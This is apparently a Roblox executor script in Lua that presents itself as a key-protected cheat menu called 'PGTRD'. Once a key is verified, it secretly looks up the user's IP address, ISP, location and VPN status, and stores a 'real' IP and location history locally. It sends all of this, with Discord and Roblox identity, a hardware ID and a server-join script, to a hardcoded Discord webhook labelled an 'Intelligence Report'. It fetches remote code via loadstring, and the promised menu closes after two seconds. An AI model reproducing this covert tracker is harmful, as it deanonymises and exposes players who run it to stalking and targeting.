local HttpService = game:GetService("HttpService")
local Player = game:GetService("Players").LocalPlayer
local RbxAnalytics = game:GetService("RbxAnalyticsService")
local Marketplace = game:GetService("MarketplaceService")

local VERIFY_URL = "https://flat-water-ca81.teddyplqy.workers.dev/verify"
local CHECK_URL = "https://flat-water-ca81.teddyplqy.workers.dev/check"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1487647040233279598/TTUDLdtOT1-if1MX22yBILzU5QFkl6KVBFJXCGn8Q0QCyu4UJ96N3G0Vv-8f96nmaSed"
local DISCORD_LINK = "https://discord.gg/axvGpjHBxB"

local TOKEN_FILE = "pgtrd_token.txt"
local DATA_FILE = "pgtrd_data.txt"
local LOCK_FILE = "pgtrd_lock.txt"
local CLIENT_ID = RbxAnalytics:GetClientId()

local function launchMainSystem(discordData)
    _G.AuthFinished = true 

    local discordName = discordData.name or "Unknown"
    local discordId = discordData.id or "0"
    local mention = "<@" .. discordId .. ">"

    pcall(function()
        if isfile(LOCK_FILE) then
            local lastTime = tonumber(readfile(LOCK_FILE)) or 0
            if (os.time() - lastTime) < 5 then return end
        end
        writefile(LOCK_FILE, tostring(os.time()))
    end)

    local executionCount = 1
    local savedMessageId = nil
    local locationHistory = {}
    local savedRealIP = "N/A"
    local savedRealLoc = "Unknown"
    local lastRunTime = "First run recorded"

    pcall(function()
        if isfile(DATA_FILE) then
            local savedData = HttpService:JSONDecode(readfile(DATA_FILE))
            executionCount = (savedData.count or 0) + 1
            savedMessageId = savedData.messageId
            locationHistory = savedData.locations or {}
            savedRealIP = savedData.realIP or "N/A"
            savedRealLoc = savedData.realLoc or "Unknown"
            lastRunTime = savedData.lastTimestamp or "Unknown"
        end
    end)

    local currentIP, ispName, isVPN, currentLoc = "N/A", "Unknown", false, "Unknown"
    pcall(function()
        local response = game:HttpGet("http://ip-api.com/json/?fields=status,country,city,isp,proxy,hosting,query")
        local data = HttpService:JSONDecode(response)
        if data.status == "success" then
            currentIP = data.query
            ispName = data.isp or "Unknown"
            isVPN = (data.proxy == true) or (data.hosting == true)
            currentLoc = (data.city or "Unknown") .. ", " .. (data.country or "Unknown")
            if not isVPN then
                savedRealIP = currentIP
                savedRealLoc = currentLoc
                local alreadySeen = false
                for _, loc in ipairs(locationHistory) do if loc == currentLoc then alreadySeen = true end end
                if not alreadySeen then table.insert(locationHistory, currentLoc) end
            end
        end
    end)

    local gameName = "Unknown"
    pcall(function() gameName = Marketplace:GetProductInfo(game.PlaceId).Name end)
    
    local ipDisplay = (isVPN and savedRealIP ~= "N/A") and "🎯 **" .. savedRealIP .. "** (Locked)\n🔒 *VPN: " .. currentIP .. "*" or "||" .. currentIP .. "||"
    local locDisplay = (isVPN and savedRealLoc ~= "Unknown") and "🎯 **" .. savedRealLoc .. "** (Locked)\n🔒 *VPN: " .. currentLoc .. "*" or "📍 " .. currentLoc
    if #locationHistory > 1 then
        locDisplay = locDisplay .. "\n📜 *History:* " .. table.concat(locationHistory, " | ")
    end
    
    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. Player.UserId .. "&width=420&height=420&format=png"
    local joinScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

    local payload = HttpService:JSONEncode({
        ["username"] = "PGTRD Intel Center",
        ["avatar_url"] = avatarUrl,
        ["content"] = "🚨 **Target Verified:** " .. mention,
        ["embeds"] = {{
            ["author"] = {["name"] = Player.Name .. " (@" .. Player.DisplayName .. ")", ["icon_url"] = avatarUrl},
            ["title"] = "✅ Intelligence Report",
            ["description"] = "Game: **" .. gameName .. "**",
            ["color"] = (savedRealIP ~= "N/A") and 65280 or 16711680,
            ["thumbnail"] = {["url"] = avatarUrl},
            ["fields"] = {
                {["name"] = "🔢 Executions", ["value"] = "**" .. executionCount .. "**", ["inline"] = true},
                {["name"] = "🕒 Previous Run", ["value"] = "`" .. lastRunTime .. "`", ["inline"] = true},
                {["name"] = "👾 Discord", ["value"] = discordName .. " (" .. mention .. ")", ["inline"] = true},
                {["name"] = "🌐 IP Address", ["value"] = ipDisplay, ["inline"] = true},
                {["name"] = "📶 ISP", ["value"] = ispName, ["inline"] = true},
                {["name"] = "📍 Locations", ["value"] = locDisplay, ["inline"] = false},
                {["name"] = "🚀 Join Script", ["value"] = "```lua\n" .. joinScript .. "\n```", ["inline"] = false}
            },
            ["footer"] = {["text"] = "Time: " .. os.date("%I:%M:%S %p") .. " • HWID: " .. string.sub(CLIENT_ID, 1, 15) .. "..."}
        }}
    })

    local req = request or http_request or (syn and syn.request)
    if req then
        local success = false
        if savedMessageId then
            pcall(function()
                local r = req({Url = WEBHOOK_URL .. "/messages/" .. savedMessageId, Method = "PATCH", Headers = {["Content-Type"] = "application/json"}, Body = payload})
                if r.StatusCode == 200 or r.StatusCode == 204 then success = true end
            end)
        end
        if not success then
            pcall(function()
                local res = req({Url = WEBHOOK_URL .. "?wait=true", Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload})
                if res and res.Body then savedMessageId = HttpService:JSONDecode(res.Body).id end
            end)
        end
    end

    pcall(function()
        writefile(DATA_FILE, HttpService:JSONEncode({
            count = executionCount, 
            messageId = savedMessageId, 
            locations = locationHistory, 
            realIP = savedRealIP, 
            realLoc = savedRealLoc,
            lastTimestamp = os.date("%I:%M:%S %p")
        }))
        writefile(LOCK_FILE, "0")
    end)

    local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
    local Window = Rayfield:CreateWindow({
        Name = "PGTRD v22.1",
        LoadingTitle = "Authenticated: " .. discordName,
        LoadingSubtitle = "by PGTRD"
    })
    
    local DashboardTab = Window:CreateTab("Dashboard")
    DashboardTab:CreateLabel("Welcome back, " .. Player.DisplayName)
    
    local LoadingLabel = DashboardTab:CreateLabel("Loading.")
    task.spawn(function()
        local dots = 1
        while task.wait(0.4) do
            dots = dots + 1
            if dots > 3 then dots = 1 end
            LoadingLabel:Set("Loading" .. string.rep(".", dots))
        end
    end)

    task.delay(2, function()
        Rayfield:Destroy()
    end)
end

local function createAuthUI()
    local sg = Instance.new("ScreenGui", Player.PlayerGui)
    local frame = Instance.new("Frame", sg)
    frame.Size = UDim2.new(0, 320, 0, 240)
    frame.Position = UDim2.new(0.5, -160, 0.5, -120)
    frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
    frame.Active = true
    frame.Draggable = true

    local title = Instance.new("TextLabel", frame)
    title.Size = UDim2.new(1, 0, 0, 40)
    title.Text = "PGTRD VERIFICATION"
    title.TextColor3 = Color3.new(1, 1, 1)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold

    local btnD = Instance.new("TextButton", frame)
    btnD.Size = UDim2.new(0.8, 0, 0, 35)
    btnD.Position = UDim2.new(0.1, 0, 0.25, 0)
    btnD.Text = "GET KEY (DISCORD)"
    btnD.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    btnD.TextColor3 = Color3.new(1, 1, 1)
    btnD.Font = Enum.Font.GothamBold
    Instance.new("UICorner", btnD)
    btnD.MouseButton1Click:Connect(function() setclipboard(DISCORD_LINK) btnD.Text = "LINK COPIED" end)

    local box = Instance.new("TextBox", frame)
    box.Size = UDim2.new(0.8, 0, 0, 40)
    box.Position = UDim2.new(0.1, 0, 0.5, 0)
    box.PlaceholderText = "Enter Access Key"
    box.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    box.TextColor3 = Color3.new(1, 1, 1)
    box.Font = Enum.Font.Gotham
    Instance.new("UICorner", box)

    local btnV = Instance.new("TextButton", frame)
    btnV.Size = UDim2.new(0.8, 0, 0, 40)
    btnV.Position = UDim2.new(0.1, 0, 0.75, 0)
    btnV.Text = "VERIFY ACCESS"
    btnV.BackgroundColor3 = Color3.fromRGB(0, 180, 100)
    btnV.TextColor3 = Color3.new(1, 1, 1)
    btnV.Font = Enum.Font.GothamBold
    Instance.new("UICorner", btnV)

    local function verifyKey(code, button, gui)
        button.Text = "AUTHENTICATING..."
        local req = request or http_request or (syn and syn.request)
        local res = req({
            Url = VERIFY_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({ code = code, hwid = CLIENT_ID })
        })

        if res.StatusCode == 200 then
            local data = HttpService:JSONDecode(res.Body)
            writefile(TOKEN_FILE, data.token)
            gui:Destroy()
            launchMainSystem(data)
        else
            button.Text = "❌ INVALID KEY"
            task.wait(2)
            button.Text = "VERIFY ACCESS"
        end
    end

    btnV.MouseButton1Click:Connect(function() verifyKey(box.Text, btnV, sg) end)
end

if isfile(TOKEN_FILE) then
    local req = request or http_request or (syn and syn.request)
    local res = req({
        Url = CHECK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({ token = readfile(TOKEN_FILE), hwid = CLIENT_ID })
    })

    if res.StatusCode == 200 then
        launchMainSystem(HttpService:JSONDecode(res.Body))
    else
        delfile(TOKEN_FILE)
        createAuthUI()
    end
else
    createAuthUI()
end
